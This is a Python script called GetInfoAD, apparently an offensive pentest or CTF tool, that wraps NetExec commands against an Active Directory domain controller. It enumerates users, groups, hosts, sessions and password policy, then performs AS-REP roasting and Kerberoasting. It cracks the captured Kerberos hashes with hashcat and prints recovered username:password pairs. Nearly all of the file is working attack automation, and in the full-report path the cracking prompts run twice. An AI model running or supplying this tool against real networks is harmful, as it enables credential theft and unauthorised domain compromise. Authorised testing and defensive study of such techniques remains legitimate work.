#!/usr/bin/env python3
import os
import subprocess
import sys
import argparse
import re
import shutil
import site
from collections import defaultdict
import datetime

colored = None
try:
    from termcolor import colored
except ImportError:
    def _install_termcolor_if_missing():
        global colored
        print("[termcolor]: Module manquant. Tentative d'installation...")
        try:
            pip_command = [sys.executable, "-m", "pip", "install", "termcolor"]
            subprocess.run(pip_command, check=True, capture_output=True)
            print("[termcolor]: Installation réussie. Rechargement chemins...")
            try: site.main()
            except Exception: pass
            try:
                import termcolor
                colored = termcolor.colored
                print("[termcolor]: Module chargé après installation.")
            except ImportError:
                print("[termcolor]: Échec chargement après install. Couleurs désactivées.")
                def fallback(text, *args, **kwargs): return text
                colored = fallback
        except Exception as e:
             print(f"[termcolor]: Échec installation ({type(e).__name__}). Couleurs désactivées.")
             def fallback(text, *args, **kwargs): return text
             colored = fallback
    _install_termcolor_if_missing()
    if colored is None:
        def fallback(text, *args, **kwargs): return text
        colored = fallback

def install_glow_if_missing():
    install_dir = "/opt/tools/glow"
    binary_path = os.path.join(install_dir, "glow")
    symlink_path = "/usr/local/bin/glow"
    if shutil.which("glow"): return
    if os.path.exists(binary_path) and not os.path.islink(symlink_path):
        print("[Glow]: Binaire trouvé localement, tentative lien symbolique...")
        try:
            print(f"[Glow]: sudo ln -sf {binary_path} {symlink_path}")
            subprocess.run(["sudo", "ln", "-sf", binary_path, symlink_path], check=True, capture_output=True)
            print(f"[Glow]: Lien symbolique créé.")
        except Exception as e: print(f"[Glow]: Erreur lien symbolique: {e}")
        return
    print("[Glow]: Glow non trouvé. Tentative clonage/compilation...")
    go_found = shutil.which("go")
    try:
        if not os.path.exists(os.path.dirname(install_dir)):
            print(f"[Glow]: sudo mkdir -p {os.path.dirname(install_dir)}")
            subprocess.run(["sudo", "mkdir", "-p", os.path.dirname(install_dir)], check=True, capture_output=True)
            subprocess.run(f"sudo chown $USER:$USER {os.path.dirname(install_dir)} || true", shell=True, executable="/bin/bash", capture_output=True)
        if not os.path.exists(install_dir):
            print(f"[Glow]: git clone https://github.com/charmbracelet/glow.git {install_dir}")
            subprocess.run(["git", "clone", "https://github.com/charmbracelet/glow.git", install_dir], check=True, capture_output=True)
        else: print(f"[Glow]: Répertoire {install_dir} existe.")
        if go_found:
            print(f"[Glow]: go build -o {binary_path} (dans {install_dir})")
            subprocess.run(["go", "build", "-o", binary_path], cwd=install_dir, check=True, capture_output=True)
        elif not os.path.exists(binary_path): print("[Glow]: Erreur: 'go' non trouvé et binaire absent."); return
        if os.path.exists(binary_path):
            print("[Glow]: Binaire trouvé/compilé. Création lien symbolique...")
            try:
                print(f"[Glow]: sudo ln -sf {binary_path} {symlink_path}")
                subprocess.run(["sudo", "ln", "-sf", binary_path, symlink_path], check=True, capture_output=True)
                print("[Glow]: Installation/liaison réussie !")
            except Exception as e: print(f"[Glow]: Erreur lien symbolique: {e}")
        else: print(f"[Glow]: Binaire introuvable après tentative compilation.")
    except Exception as e: print(f"[Glow]: Erreur installation: {e}")


def check_env_vars():
    env = {}
    for var in ["IP", "USER", "PASSWORD"]: env[var] = os.getenv(var)
    env['ALL_SET'] = all(env.values())
    return env

def banner():
    print()
    print(colored("╔" + "═"*58 + "╗", "cyan"))
    print(colored("║       🔍 GetInfoAD - Active Directory (with NXC)        ║", "green", attrs=["bold"]))
    print(colored("╚" + "═"*58 + "╝", "cyan"))
    print()

def show_env(env):
    print(colored("🌐 Environment variables:", "yellow", attrs=["bold"]))
    for key, value in env.items():
        if key == 'ALL_SET': continue
        display_value = value # Afficher la vraie valeur
        status = colored("✅", "green") if value else colored("❌", "red")
        print(f"   {status} {key} = {colored(display_value, 'cyan') if value else colored('is not set', 'red')}")
    print()

def run_command(command):
    # print(colored(f"    Kommande : {command}", "light_grey")) # Supprimé
    try:
        result = subprocess.run(command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True, env=os.environ)
        return result.stdout.strip().splitlines()
    except subprocess.CalledProcessError as e:
        print(colored(f"❌ Command failed: {command}", "red"))
        print(colored(f"--- Error Output ---\n{e.stderr.strip() if e.stderr else '(none)'}", "red"))
        if e.stdout: print(colored(f"--- Stdout Output ---\n{e.stdout.strip()}", "yellow"))
        print(colored("--- End Error ---", "red"))
        return []
    except FileNotFoundError:
        cmd_failed = command.split()[0]
        print(colored(f"❌ Command failed: '{cmd_failed}' not found.", "red"))
        return []
    except Exception as e:
        print(colored(f"❌ Unexpected error running command '{command}': {e}", "red"))
        return []

def ask_to_save(data, default_name):
    if not data: print(colored(f"ℹ️ No data to save for {default_name}.", "blue")); return
    choice = 'n' # Default
    if sys.stdin.isatty(): # Vérifier si stdin est interactif
        try:
            choice = input(colored(f"\n📂 Save this list ({len(data)} items) to '{default_name}'? (y/N) > ", "yellow")).strip().lower()
        except EOFError:
            choice = 'n' # Traiter Ctrl+D comme 'n'
    else:
        print(colored(f"\nℹ️ Non-interactive mode detected. Assuming 'No' for saving '{default_name}'.", "blue"))

    if choice == "y":
        filename = default_name
        try:
            with open(filename, "w") as f: f.write("\n".join(map(str, data)) + "\n")
            print(colored(f"✅ Successfully saved to: {os.path.abspath(filename)}", "green", attrs=["bold"]))
        except Exception as e: print(colored(f"❌ Error saving to {filename}: {e}", "red"))
    else: print(colored(f"📬 List not saved ({default_name}).", "yellow"))


def get_users():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --users'''
    print(colored("▶️  Retrieving domain users ...", "cyan"))
    lines = run_command(command)
    users = []
    for line in lines:
        if (
            line.startswith("LDAP")
            and not any(excl in line for excl in [
                "-Username-", "krbtgt", "Guest", "DefaultAccount",
                "WDAGUtilityAccount", "[+]", "[*]"
            ])
        ):
            parts = line.split()
            if len(parts) >= 5:
                users.append(parts[4])

    return sorted(list(set(users)))

def get_machines(with_versions=False):
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    print(colored("▶️  Retrieving computers ...", "cyan"))
    lines = run_command(command)
    hosts = {}
    for line in lines:
        match_name = re.search(r'\(name:([^)]+)\)', line)
        if match_name:
            hostname = match_name.group(1).strip()
            if with_versions:
                os_match = re.search(r'\[\*\] (.*?) \(name:', line)
                os_info = os_match.group(1).strip() if os_match else "Unknown OS"
                hosts[hostname] = os_info
            else:
                hosts[hostname] = None
    return dict(sorted(hosts.items()))

def get_groups():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --groups'''
    print(colored("▶️  Retrieving domain groups  ...", "cyan"))
    lines = run_command(command)
    groups = []
    for line in lines:
        match = re.search(r'\s+DC01\s+(.*?)\s+membercount', line)
        if match:
            group = match.group(1).strip()
            if group:
                groups.append(group)
    return sorted(list(set(groups)))

def get_loggedon_users():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --loggedon-users'''
    print(colored("▶️  Retrieving logged-on users (Targeted DC)...", "cyan"))
    lines = run_command(command)
    sessions = defaultdict(lambda: {"ip": os.getenv("IP"), "users": set()})
    target_host = None
    dc_host_regex = re.compile(r'^SMB\s+\S+\s+\d+\s+(\S+)')
    user_logon_regex = re.compile(r'\s([^\\]+\\[\w\d\.\-\$]+)\s+')
    for line in lines:
        if not target_host:
             host_match = dc_host_regex.match(line)
             if host_match: target_host = host_match.group(1)
        if target_host:
            found_users = user_logon_regex.findall(line)
            for user in found_users:
                 if not user.endswith('$') and '\\' in user:
                     sessions[target_host]["users"].add(user.strip())
    final_sessions = {}
    for host, data in sessions.items():
        if data["users"]: final_sessions[host] = {"ip": data["ip"], "users": sorted(list(data["users"]))}
    return final_sessions

def get_interfaces():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --interfaces'''
    print(colored("▶️  Retrieving network interfaces (Targeted DC)...", "cyan"))
    lines = run_command(command)
    parsed = []
    seen_ips = set()
    dc_host = None
    dc_host_regex = re.compile(r'^SMB\s+\S+\s+\d+\s+(\S+)')
    if_regex = re.compile(r'(Ethernet\d+|vEthernet \(.*\))\s+\|\s+([\d\.]+)\s+\|\s+(.*?)\s+\|\s+(.*?)\s+\|\s+(True|False)')
    for line in lines:
        if not dc_host:
            host_match = dc_host_regex.match(line)
            if host_match: dc_host = host_match.group(1)
        match = if_regex.search(line)
        if match:
            if_name, ip_addr, mask, gw, dhcp = match.groups()
            if ip_addr not in seen_ips:
                host_prefix = f"{dc_host} - " if dc_host else ""
                entry = f"{host_prefix}{if_name.strip()} - {ip_addr}  | Mask: {mask}  | Gateway: {gw}  | DHCP: {dhcp}"
                parsed.append(entry)
                seen_ips.add(ip_addr)
    return sorted(parsed)

def get_passpol():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --pass-pol'''
    print(colored("▶️  Retrieving password policy (Targeted DC)...", "cyan"))
    lines = run_command(command)
    filtered = []
    seen = set()
    for line in lines:
        clean = re.sub(r'^SMB\s+\S+\s+\d+\s+\S+\s+', '', line).strip()
        if clean.startswith("[+]"): continue
        if any(keyword in clean.lower() for keyword in ["password", "lockout", "complex", "minimum", "maximum", "reset", "threshold", "length", "age", "history", "duration"]):
            if clean not in seen:
                filtered.append(clean)
                seen.add(clean)
    return filtered

def get_domain_name():
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    result = run_command(command)
    domain_regex = re.compile(r'\s\(domain:([^)]+)\)')
    for line in result:
        match = domain_regex.search(line)
        if match:
            domain = match.group(1).strip().upper()
            # print(colored(f"   Domain found: {domain}", "light_grey")) # Moins verbeux
            return domain
    print(colored("⚠️ Could not determine domain name from NXC SMB output.", "yellow"))
    return "UnknownDomain.LOCAL"

def get_asreproast(users):
    print(colored("▶️  Performing AS-REP Roasting  ...", "cyan"))
    if not users: print(colored("❌ Cannot AS-REP Roast: User list empty.", "red")); return []
    users_file_path = "getinfoad_temp_users.txt"
    output_file = "asreproast_hashes.txt"
    try:
        with open(users_file_path, "w") as f: f.write("\n".join(users) + "\n")
    except Exception as e: print(colored(f"❌ Failed write temp user list '{users_file_path}': {e}", "red")); return []
    command = f"nxc ldap $IP -u '{users_file_path}' -p '' --asreproast '{output_file}'"
    run_command(command)
    try:
        if os.path.exists(users_file_path): os.remove(users_file_path)
    except OSError as e: print(colored(f"⚠️ Warn: Could not remove temp file {users_file_path}: {e}", "yellow"))
    hashes = []
    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
        try:
            with open(output_file, "r") as f:
                hashes = sorted(list(set(line.strip() for line in f if line.strip() and "$krb5asrep$" in line)))
            if hashes: print(colored(f"✅ Found {len(hashes)} AS-REP hash(es). Saved in {output_file}", "green"))
            else: print(colored(f"ℹ️ AS-REP file ({output_file}) exists but no valid hashes.", "blue"))
        except Exception as e: print(colored(f"❌ Failed read/process AS-REP hashes from {output_file}: {e}", "red"))
    else: print(colored(f"ℹ️ AS-REP file ({output_file}) not found or empty.", "blue"))
    return hashes

def get_kerberost():
    print(colored("▶️  Performing Kerberos Roasting  ...", "cyan"))
    output_file = "kerberoast_hashes.txt"
    command = f"nxc ldap $IP -u $USER -p $PASSWORD --kerberoasting '{output_file}'"
    run_command(command)
    hashes = []
    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
        try:
            with open(output_file, "r") as f:
                hashes = sorted(list(set(line.strip() for line in f if line.strip() and "$krb5tgs$" in line)))
            if hashes: print(colored(f"✅ Found {len(hashes)} Kerberoastable hash(es). Saved in {output_file}", "green"))
            else: print(colored(f"ℹ️ Kerberoasting file ({output_file}) exists but no valid hashes.", "blue"))
        except Exception as e: print(colored(f"❌ Failed read/process Kerberos hashes from {output_file}: {e}", "red"))
    else: print(colored(f"ℹ️ Kerberoasting file ({output_file}) not found or empty.", "blue"))
    return hashes


def ask_crack_kerberos_hashes():
    print(colored("-" * 60, "magenta"))
    kerberos_hashfile = "kerberoast_hashes.txt"
    if not os.path.exists(kerberos_hashfile) or os.path.getsize(kerberos_hashfile) == 0:
        print(colored(f"ℹ️ Kerberos hash file '{kerberos_hashfile}' not found or empty. Skipping cracking.", "blue")); return
    choice = 'n' # Default
    if sys.stdin.isatty():
        try: choice = input(colored(f"🧨 Crack Kerberos hashes in '{kerberos_hashfile}'? (y/N) > ", "yellow")).strip().lower()
        except EOFError: choice = 'n'
    else:
        print(colored(f"\nℹ️ Non-interactive mode detected. Assuming 'No' for cracking '{kerberos_hashfile}'.", "blue"))

    if choice != "y": print(colored("🚫 Skipping Kerberos hash cracking.", "yellow")); return
    print(colored("📂 Select wordlist ...", "cyan"))
    wordlist = ""
    try:
        wordlist_paths = "/opt/lists /usr/share/wordlists /usr/share/seclists /wordlists"
        find_cmd = f"find {' '.join(wordlist_paths.split())} -type f -size +1k -print0 2>/dev/null | fzf --read0 --prompt 'Select Wordlist> ' --preview 'bat --color=always {{}} || head -n 50 {{}}' --height 40%"
        wordlist = subprocess.check_output(find_cmd, shell=True, text=True, executable="/bin/bash").strip()
        if not wordlist: print(colored("❌ No wordlist selected. Aborting crack.", "red")); return
        if not os.path.isfile(wordlist): print(colored(f"❌ Selected path is not a file: {wordlist}. Aborting crack.", "red")); return
        try: size_mb = os.path.getsize(wordlist) / (1024*1024); print(colored(f"✔️ Using wordlist: {wordlist} ({size_mb:.2f} MB)", "green"))
        except Exception: print(colored(f"✔️ Using wordlist: {wordlist}", "green"))
    except Exception as e: print(colored(f"❌ Error during wordlist selection: {e}", "red")); return
    print(colored(f"🚀 Launching hashcat Kerberos TGS (Mode 13100) on '{kerberos_hashfile}'...", "magenta"))
    potfile = "hashcat_kerberos.potfile"
    hashcat_cmd = ["hashcat", "-m", "13100", "--potfile-path", os.path.abspath(potfile), os.path.abspath(kerberos_hashfile), os.path.abspath(wordlist)]
    cracked_credentials = []
    try:
        process = subprocess.run(hashcat_cmd, capture_output=True, text=True, check=False); return_code = process.returncode
        print(colored(f"🔎 Reading cracked hashes: {potfile}", "cyan"))
        if os.path.exists(potfile):
            found_in_pot = False
            with open(potfile, 'r') as f:
                for line in f:
                    line = line.strip();
                    if not line or "$krb5tgs$" not in line: continue
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        hash_part, password = parts
                        spn_match = re.search(r'\$krb5tgs\$\d+\$\*.*?\$.*?\$(.+?)\*:', hash_part)
                        if spn_match: cracked_credentials.append(f"{spn_match.group(1)}:{password}"); found_in_pot = True
                        else: cracked_credentials.append(f"UnknownKerberosFormat:{password}"); found_in_pot = True
            if cracked_credentials:
                print(colored("\n🎉 Cracked Kerberos Credentials (SPN:Password):", "green", attrs=["bold"]))
                for cred in sorted(list(set(cracked_credentials))): print(colored(f"  -> {cred}", "cyan"))
            elif found_in_pot: print(colored("ℹ️ Potfile read, but no Kerberos TGS hashes found cracked.", "blue"))
            else: print(colored("ℹ️ No Kerberos hashes found cracked in the potfile.", "blue"))
        else: print(colored(f"ℹ️ Potfile '{potfile}' not found. No results.", "blue"))
    except FileNotFoundError: print(colored("❌ Hashcat command not found.", "red"))
    except Exception as e: print(colored(f"❌ Unexpected error during Kerberos hashcat: {e}", "red")); import traceback; traceback.print_exc()
    print(colored("✅ Finished Kerberos hash cracking attempt.", "green"))


def ask_crack_hashes(): # AS-REP
    asrep_hashfile = "asreproast_hashes.txt"
    if not os.path.exists(asrep_hashfile) or os.path.getsize(asrep_hashfile) == 0:
        print(colored(f"ℹ️ AS-REP hash file '{asrep_hashfile}' not found or empty. Skipping cracking.", "blue")); return
    choice = 'n' # Default
    if sys.stdin.isatty():
        try: choice = input(colored(f"🧨 Crack AS-REP hashes in '{asrep_hashfile}'? (y/N) > ", "yellow")).strip().lower()
        except EOFError: choice = 'n'
    else:
        print(colored(f"\nℹ️ Non-interactive mode detected. Assuming 'No' for cracking '{asrep_hashfile}'.", "blue"))

    if choice != "y": print(colored("🚫 Skipping AS-REP hash cracking.", "yellow")); return
    print(colored("📂 Select wordlist ...", "cyan"))
    wordlist = ""
    try:
        wordlist_paths = "/opt/lists /usr/share/wordlists /usr/share/seclists /wordlists"
        find_cmd = f"find {' '.join(wordlist_paths.split())} -type f -size +1k -print0 2>/dev/null | fzf --read0 --prompt 'Select Wordlist> ' --preview 'bat --color=always {{}} || head -n 50 {{}}' --height 40%"
        wordlist = subprocess.check_output(find_cmd, shell=True, text=True, executable="/bin/bash").strip()
        if not wordlist: print(colored("❌ No wordlist selected. Aborting crack.", "red")); return
        if not os.path.isfile(wordlist): print(colored(f"❌ Selected path is not a file: {wordlist}. Aborting crack.", "red")); return
        try: size_mb = os.path.getsize(wordlist) / (1024*1024); print(colored(f"✔️ Using wordlist: {wordlist} ({size_mb:.2f} MB)", "green"))
        except Exception: print(colored(f"✔️ Using wordlist: {wordlist}", "green"))
    except Exception as e: print(colored(f"❌ Error during wordlist selection: {e}", "red")); return
    print(colored(f"🚀 Launching hashcat AS-REP (Mode 18200) on '{asrep_hashfile}'...", "magenta"))
    potfile = "hashcat_asrep.potfile"
    hashcat_cmd = ["hashcat", "-m", "18200", "--potfile-path", os.path.abspath(potfile), os.path.abspath(asrep_hashfile), os.path.abspath(wordlist)]
    cracked_credentials = []
    try:
        process = subprocess.run(hashcat_cmd, capture_output=True, text=True, check=False); return_code = process.returncode
        print(colored(f"🔎 Reading cracked hashes: {potfile}", "cyan"))
        if os.path.exists(potfile):
            found_in_pot = False
            with open(potfile, "r") as f:
                for line in f:
                    line = line.strip();
                    if not line or "$krb5asrep$" not in line: continue
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        hash_part, password = parts
                        user_match = re.search(r'\$krb5asrep\$\d+\$([^@]+)@', hash_part)
                        if user_match: cracked_credentials.append(f"{user_match.group(1)}:{password}"); found_in_pot = True
                        else: cracked_credentials.append(f"UnknownASREPUser:{password}"); found_in_pot = True
            if cracked_credentials:
                print(colored("\n🎉 Cracked AS-REP Credentials (Username:Password):", "green", attrs=["bold"]))
                unique_cracked = sorted(list(set(cracked_credentials)))
                for cred in unique_cracked: print(colored(f"  -> {cred}", "cyan"))
            elif found_in_pot: print(colored("ℹ️ Potfile read, but no AS-REP hashes found cracked.", "blue"))
            else: print(colored("ℹ️ No AS-REP hashes found cracked in the potfile.", "blue"))
        else: print(colored(f"ℹ️ Potfile '{potfile}' not found. No results.", "blue"))
    except FileNotFoundError: print(colored("❌ Hashcat command not found.", "red"))
    except Exception as e: print(colored(f"❌ Unexpected error during AS-REP hashcat: {e}", "red")); import traceback; traceback.print_exc()
    print(colored("✅ Finished AS-REP hash cracking attempt.", "green"))


def full_report():
    domain = get_domain_name()
    print(colored(f"\n📘 Get Infos for domain: {domain}", "cyan", attrs=["bold"]))
    print(colored("=" * 60, "cyan"))
    report_data = {}
    print(colored("\n--- Collecting ---", "yellow"))
    report_data['users'] = get_users()
    report_data['groups'] = get_groups()
    report_data['machines_os'] = get_machines(with_versions=True)
    report_data['loggedon'] = get_loggedon_users()
    report_data['interfaces'] = get_interfaces()
    report_data['passpol'] = get_passpol()
    print(colored("--- End Collecting ---\n", "yellow"))
    print(colored("\n--- Roasting ---", "yellow"))
    report_data['asreproast'] = get_asreproast(report_data.get('users', []))
    report_data['kerberost'] = get_kerberost()
    print(colored("--- End Roasting ---\n", "yellow"))

    md = []
    md.append(f"# Active Directory Report - {domain}\n")
    md.append(f"Generated on: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    def add_md_section(title, data_list, code_block=True, info_if_empty=""):
        md.append(f"## {title}\n")
        if data_list:
            md.append(f"Total: {len(data_list)}\n")
            if code_block: md.append("```")
            md.extend(map(str, data_list))
            if code_block: md.append("```")
        elif info_if_empty: md.append(info_if_empty)
        md.append("")
    add_md_section("👤 Domain Users", report_data.get('users'), info_if_empty="_No users found (check NXC output/parsing)._")
    add_md_section("👥 Domain Groups", report_data.get('groups'), info_if_empty="_No groups found (check NXC output/parsing)._")
    md.append("## 🖥️ Domain Machines (OS from DC scan)\n")
    machines_os_data = report_data.get('machines_os')
    if machines_os_data:
        md.append(f"Total: {len(machines_os_data)}\n```\n")
        max_len = max(len(h) for h in machines_os_data) if machines_os_data else 20
        for host, osinfo in machines_os_data.items(): md.append(f"{host.ljust(max_len)} — {osinfo if osinfo else 'OS Unknown'}")
        md.append("```\n")
    else: md.append("_No machine OS info retrieved (check NXC output/parsing)._\n")
    md.append("## 👨‍💻 Logged-on Users (from DC scan)\n")
    loggedon_data = report_data.get('loggedon')
    if loggedon_data:
        md.append(f"Found sessions on {len(loggedon_data)} machine(s):\n")
        for host, info in loggedon_data.items():
            md.append(f"### Host: {host} ({info.get('ip', 'IP Unknown')})")
            if info.get("users"): md.append(f"```\n" + "\n".join([f"- {u}" for u in info["users"]]) + "\n```")
            else: md.append("_No users found._")
    else: md.append("_No logged-on user sessions found (check NXC output/parsing)._\n")
    add_md_section("🌐 Network Interfaces (from DC)", report_data.get('interfaces'), info_if_empty="_No interfaces retrieved (check NXC output/parsing)._")
    add_md_section("🔐 Password Policy (from DC)", report_data.get('passpol'), info_if_empty="_Password policy not retrieved._")
    add_md_section("🔥 AS-REP Roasting Hashes", report_data.get('asreproast'), info_if_empty="_No AS-REP hashes found._")
    add_md_section("🔥 Kerberoasting Hashes", report_data.get('kerberost'), info_if_empty="_No Kerberoasting hashes found._")

    markdown_output = "\n".join(md)
    filename = f"AD_Report_{domain.replace('.', '_')}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    try:
        with open(filename, "w", encoding='utf-8') as f: f.write(markdown_output + "\n")
        print(colored(f"✅ Report saved to: {os.path.abspath(filename)}", "green", attrs=["bold"]))
    except Exception as e:
        print(colored(f"❌ Error saving report '{filename}': {e}", "red"))
        return None
    return filename



def main():
    parser = argparse.ArgumentParser(
        description="GetInfoAD - Active Directory Enumeration Tool using NXC (NetExec)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""Examples:
  {os.path.basename(sys.argv[0])}                # Run full report (default)
  {os.path.basename(sys.argv[0])} --users        # List domain users  
  {os.path.basename(sys.argv[0])} --machines     # List machines/OS  
  {os.path.basename(sys.argv[0])} --os           # Alias for --machines
  {os.path.basename(sys.argv[0])} --kerberstable # Perform only Kerberoasting + crack prompt
  {os.path.basename(sys.argv[0])} --asreprostable # Perform only AS-REP roasting + crack prompt

Requires NXC (NetExec), fzf, hashcat, and Go (for optional Glow install).
Environment variables IP, USER, PASSWORD must be set.
Example: export IP=10.10.10.1 USER='DOMAIN\\user' PASSWORD='password'""")

    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--users", action="store_true", help="List domain users (Original Parsing)")
    group.add_argument("-m", "--machines", action="store_true", help="List machines/OS (Original Parsing)")
    group.add_argument("-o", "--os", action="store_true", help="Alias for --machines")
    group.add_argument("--groups", action="store_true", help="List domain groups (Original Parsing)")
    group.add_argument("--loggedon", action="store_true", help="List logged on users (Targeted DC)")
    group.add_argument("--passpol", action="store_true", help="Show password policy (Targeted DC)")
    group.add_argument("--interfaces", action="store_true", help="Show network interfaces (Targeted DC)")
    group.add_argument("--kerberstable", action="store_true", help="Perform Kerberoasting & prompt crack")
    group.add_argument("-a", "--asreprostable", action="store_true", help="Perform AS-REP roasting & prompt crack")
    group.add_argument("-f", "--full", action="store_true", help="Generate full report & prompt crack (default)")
    args = parser.parse_args()

    if args.os: args.machines = True; args.os = False

    is_any_arg_set = any(getattr(args, name) for name in vars(args))
    if not is_any_arg_set: print(colored("ℹ️ No specific action chosen, running default: --full report", "blue")); args.full = True

    install_glow_if_missing(); banner(); env = check_env_vars(); show_env(env)
    if not env['ALL_SET']: print(colored("\n❌ Critical Error: Set IP, USER, PASSWORD env vars.", "red", attrs=["bold"])); sys.exit(1)

    results = None
    if args.users: results = get_users(); print("\n".join(results)); ask_to_save(results, "users.txt")
    elif args.machines:
        results_dict = get_machines(with_versions=True)
        max_len = max(len(h) for h in results_dict) if results_dict else 20
        results = [f"{host.ljust(max_len)} — {osinfo if osinfo else 'OS Unknown'}" for host, osinfo in results_dict.items()]
        print("\n".join(results)); ask_to_save(results, "machines_with_os.txt")
    elif args.groups: results = get_groups(); print("\n".join(results)); ask_to_save(results, "groups.txt")
    elif args.loggedon:
         results_dict = get_loggedon_users(); output = []
         if results_dict:
             for host, info in results_dict.items():
                 output.append(f"Host: {host} ({info.get('ip', 'IP Unknown')})")
                 if info.get("users"): output.extend([f"  - {user}" for user in info["users"]])
         else: output.append("No logged-on user information retrieved.")
         results = output; print("\n".join(results)); ask_to_save(results, "loggedon_users.txt")
    elif args.passpol: results = get_passpol(); print("\n".join(results)); ask_to_save(results, "password_policy.txt")
    elif args.interfaces: results = get_interfaces(); print("\n".join(results)); ask_to_save(results, "interfaces.txt")
    elif args.kerberstable:
         results = get_kerberost()
         if results: ask_crack_kerberos_hashes()
    elif args.asreprostable:
        print(colored("ℹ️ AS-REP requires user list...", "blue"))
        users = get_users()
        if users:
            results = get_asreproast(users)
            if results: ask_crack_hashes()
        else: print(colored("❌ No users found, cannot AS-REP roast.", "red"))
    elif args.full:
        filename = full_report()

        print(colored("\n[CRACK]", "yellow", attrs=["bold"]))
        print(colored("\n--- Starting Kerberos Hash Cracking Step ---", "magenta"))
        try: ask_crack_kerberos_hashes()
        except Exception as e:
            print(colored(f"❌ Error during Kerberos cracking: {e}", "red"))
            import traceback; traceback.print_exc()
        finally:
            print(colored("--- Finished Kerberos Hash Cracking Step ---", "magenta"))

        print(colored("\n--- Starting AS-REP Hash Cracking Step ---", "magenta"))
        try: ask_crack_hashes()
        except Exception as e:
            print(colored(f"❌ Error during AS-REP cracking: {e}", "red"))
            import traceback; traceback.print_exc()
        finally:
            print(colored("--- Finished AS-REP Hash Cracking Step ---", "magenta"))

        # ✅ Affichage du fichier markdown avec Glow
        if filename:
            try:
                subprocess.run(["glow", os.path.abspath(filename)])
            except Exception as e:
                print(colored(f"⚠️ Erreur lors de l'affichage avec glow: {e}", "yellow"))
        

        print(colored("\n[CRACK]", "yellow", attrs=["bold"]))

        print(colored("\n--- Starting Kerberos Hash Cracking Step ---", "magenta"))
        try: ask_crack_kerberos_hashes()
        except Exception as e: print(colored(f"❌ Error during Kerberos cracking: {e}", "red")); import traceback; traceback.print_exc()
        finally: print(colored("--- Finished Kerberos Hash Cracking Step ---", "magenta"))
        print(colored("\n--- Starting AS-REP Hash Cracking Step ---", "magenta"))
        try: ask_crack_hashes()
        except Exception as e: print(colored(f"❌ Error during AS-REP cracking: {e}", "red")); import traceback; traceback.print_exc()
        finally: print(colored("--- Finished AS-REP Hash Cracking Step ---", "magenta"))
    
   
    print(colored("\n✅ Script finished.", "green", attrs=["bold"]))

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(colored("\n\n🚨 Interrupted by user.", "yellow")); sys.exit(1)
    except Exception as e: print(colored(f"\n\n💥 Unhandled error: {e}", "red", attrs=["bold"])); import traceback; traceback.print_exc(); sys.exit(2)
